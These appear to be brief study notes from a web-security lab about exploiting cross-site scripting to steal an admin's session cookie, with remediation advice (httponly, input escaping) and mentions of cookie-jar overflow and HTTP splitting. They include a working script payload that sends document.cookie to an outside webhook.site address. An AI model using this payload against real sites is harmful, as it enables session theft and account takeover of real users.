- create image that will ask webhook for image(then reload admin page)(and then show the admin cookie in webhook)
```js
<script>var i=new Image;i.src="https://webhook.site/512116a1-a097-4166-8603-f91a28a1f21a/?"+document.cookie;</script>
```

- u can check in admin page in console by :
```js
document.cookie
```
 ---
 
 -As solution to this vuln. httponly must = true , so that js cannot access document.cookie ; or filter user input (escape data input) by making src=card.pic in pug file ;

---
- another attack : cookie jar overflow
	cookie jar overflow : create many cookies so that browser delete cookies in order of time and kick everyone out  of the web 

---
- http splitting attack :
	u can bypass httponly
